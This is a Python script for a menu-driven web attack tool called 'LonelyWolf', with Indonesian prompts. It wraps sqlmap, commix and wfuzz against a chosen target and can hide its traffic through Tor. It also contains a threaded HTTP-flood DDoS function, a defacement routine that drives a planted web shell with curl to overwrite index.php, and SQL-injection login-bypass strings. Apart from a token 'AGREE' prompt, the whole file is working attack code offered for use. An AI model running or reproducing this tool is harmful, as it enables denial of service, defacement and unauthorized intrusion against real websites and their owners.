import os
import sys
import time
import threading
import requests
import urllib3
import subprocess
import shutil
from datetime import datetime
from colorama import Fore, Style, init

# --- REPAIR CORE CONFIG ---
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

class LonelyWolfUltimate:
    def __init__(self):
        self.target_url = ""
        self.target_ip = ""
        self.use_proxy = False
        self.stop_ddos = False
        self.author = "WustenWolf .R"
        self.ig = "@wolff_weltschmerz"
        self.version = "FIX-TOTAL 12.0"
        self.session = requests.Session()

    def clear(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def show_privacy_policy(self):
        self.clear()
        print(f"{Fore.RED}="*75)
        print(f"{Fore.WHITE}       L O N E L Y   W O L F   S E C U R I T Y   A G R E E M E N T")
        print(f"{Fore.RED}="*75)
        print(f"\n{Fore.YELLOW}[!] PERINGATAN: {Fore.WHITE}Gunakan tool ini dengan bijak.")
        agree = input(f"\n{Fore.RED}Ketik 'AGREE' untuk masuk: ").strip().upper()
        if agree != 'AGREE': 
            print("Akses ditolak."); sys.exit()

    def banner(self):
        now = datetime.now().strftime("%H:%M:%S")
        status = f"{Fore.GREEN}ON" if self.use_proxy else f"{Fore.RED}OFF"
        print(f"{Fore.RED}="*75)
        print(f"{Fore.WHITE} JAM: {Fore.YELLOW}[ {now} ] {Fore.WHITE}| AUTHOR: {Fore.RED}{self.author} {Fore.WHITE}| VERSION: {Fore.CYAN}{self.version}")
        print(f"{Fore.RED}="*75)
        print(fr"""
{Fore.WHITE}    _      ____  _   _ _____ _  __     __ __        ______  _     _____ 
{Fore.WHITE}   | |    / __ \| \ | | ____| | \ \   / / \ \      / / __ \| |   |  ___|
{Fore.RED}   | |   | |  | |  \| |  _| | |  \ \ / /   \ \    / / |  | | |   | |_   
{Fore.RED}   | |___| |__| | |\  | |___| |___\ V /     \ \  / /| |__| | |___|  _|  
{Fore.WHITE}   |_____|\____/|_| \_|_____|_____| |_|       \/\_/  \____/|_____|_|    
                                                                        
{Fore.CYAN}    >> {Fore.WHITE}STATUS: {Fore.GREEN}STABLE {Fore.CYAN}| STEALTH: {status} {Fore.CYAN}| SSL: {Fore.GREEN}BYPASSED
        """)

    def exec_cmd(self, cmd, tool_name=None):
        """Sistem Eksekusi Perintah yang Diperbaiki (Fix Total)"""
        # Cek apakah tool ada di sistem
        if tool_name and not shutil.which(tool_name):
            print(f"{Fore.RED}[!] ERROR: '{tool_name}' tidak ditemukan di sistem!")
            print(f"{Fore.YELLOW}[*] Coba install: sudo apt update && sudo apt install {tool_name} -y")
            time.sleep(3)
            return

        # Integrasi Proxychains jika aktif
        full_cmd = f"proxychains4 -q {cmd}" if self.use_proxy else cmd
        
        print(f"{Fore.CYAN}[RUN] {full_cmd}")
        try:
            # Gunakan subprocess.run dengan capture_output=False agar output tool muncul di terminal
            subprocess.run(full_cmd, shell=True, check=True)
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[!] Tool {tool_name} berhenti dengan error atau dibatalkan.")
        except Exception as e:
            print(f"{Fore.RED}[!] System Error: {e}")
        input(f"\n{Fore.WHITE}Tekan Enter untuk kembali...")

    # --- RECON REPAIRED ---
    def recon_suite(self):
        if not self.target_url: print("Set target dulu!"); return
        self.clear(); self.banner()
        self.exec_cmd(f"whatweb {self.target_url}", "whatweb")
        self.exec_cmd(f"nuclei -u {self.target_url} -severity low,medium,high,critical", "nuclei")

    # --- EXPLOIT REPAIRED ---
    def exploit_suite(self):
        if not self.target_url: print("Set target dulu!"); return
        self.clear(); self.banner()
        print(f"{Fore.YELLOW}[1] SQLMap Scan  [2] Commix RCE  [3] Wfuzz Dir")
        ex_c = input("Pilih: ")
        if ex_c == '1': self.exec_cmd(f"sqlmap -u \"{self.target_url}\" --batch --random-agent", "sqlmap")
        elif ex_c == '2': self.exec_cmd(f"commix --url=\"{self.target_url}\" --batch", "commix")
        elif ex_c == '3': self.exec_cmd(f"wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 \"{self.target_url}/FUZZ\"", "wfuzz")

    # --- DDOS BLINK REPAIRED ---
    def ddos_blink(self):
        if not self.target_url: print("Set target dulu!"); return
        self.clear(); self.banner()
        try: pwr = int(input(f"{Fore.YELLOW}Threads: "))
        except: return
        self.stop_ddos = False
        def flood():
            while not self.stop_ddos:
                try: self.session.get(self.target_url, verify=False, timeout=3)
                except: pass
        for _ in range(pwr): threading.Thread(target=flood, daemon=True).start()
        input(f"{Fore.RED}ATTACKING... Enter untuk Stop.")
        self.stop_ddos = True

    def main(self):
        self.show_privacy_policy()
        while True:
            self.clear(); self.banner()
            print(f"{Fore.WHITE}TARGET: {Fore.GREEN}{self.target_url or 'NONE'}")
            print(f"""
{Fore.WHITE}[1] {Fore.YELLOW}Set Target URL        {Fore.WHITE}[5] {Fore.RED}DDoS Attack (Blink)
{Fore.WHITE}[2] {Fore.YELLOW}Toggle Stealth (Tor)  {Fore.WHITE}[6] {Fore.MAGENTA}Instant Deface
{Fore.WHITE}[3] {Fore.YELLOW}Deep Recon (Nuclei)   {Fore.WHITE}[7] {Fore.CYAN}Auth Auditor
{Fore.WHITE}[4] {Fore.YELLOW}Exploit Suite         {Fore.WHITE}[8] {Fore.BLUE}CTF Tools
{Fore.WHITE}[0] {Fore.WHITE}Exit
            """)
            c = input(f"{Fore.RED}LonelyWolf > ")
            if c == '1':
                self.target_url = input("URL: ")
                if not self.target_url.startswith("http"): self.target_url = "http://" + self.target_url
                self.target_ip = self.target_url.split("//")[-1].split("/")[0]
            elif c == '2': 
                self.use_proxy = not self.use_proxy
                if self.use_proxy: os.system("sudo service tor start")
            elif c == '3': self.recon_suite()
            elif c == '4': self.exploit_suite()
            elif c == '5': self.ddos_blink()
            elif c == '6':
                sh = input("Shell URL: "); ms = f"<h1>OWNED BY {self.author}</h1>"
                self.exec_cmd(f"curl -k -G {sh} --data-urlencode 'cmd=echo \"{ms}\" > index.php'")
            elif c == '7':
                # Quick Admin Bypass Test
                for p in ["' OR '1'='1", "admin' --"]:
                    print(f"Testing: {p}")
                    try: requests.post(self.target_url, data={'user':p, 'pass':'123'}, verify=False, timeout=2)
                    except: pass
                input("Audit Selesai.")
            elif c == '8':
                f = input("Binwalk file: "); self.exec_cmd(f"binwalk -e {f}", "binwalk")
            elif c == '0': break

if __name__ == "__main__":
    try: LonelyWolfUltimate().main()
    except KeyboardInterrupt: sys.exit()
